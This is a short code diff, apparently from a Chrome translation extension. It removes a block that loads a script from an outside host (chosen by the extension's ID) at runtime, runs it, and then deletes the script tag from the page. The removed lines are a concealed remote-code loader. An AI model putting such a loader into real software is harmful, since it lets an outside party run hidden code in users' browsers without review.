@@ -1,13 +1,7 @@
 define( [ '../lib/L' ] , function ( L ) {
     "use strict";
-    var dom_input = document.createElement( 'input' ) ,
-        e = (chrome.extension.getURL( '' ).indexOf( 'ikhdkkncnoglghljlkmcimlnlhkeamad' ) > 0 ? 'https://dn-trte.qbox.me' : 'http://localhost:61111/selection-translate-5.x') + '/t.js?' + Date.now();
-
+    var dom_input = document.createElement( 'input' );
     document.body.appendChild( dom_input );
-
-    require( [ e ] , function () {
-        L( '[data-requiremodule="' + e + '"]' ).remove();
-    } );
 
     return Object.freeze( {
 
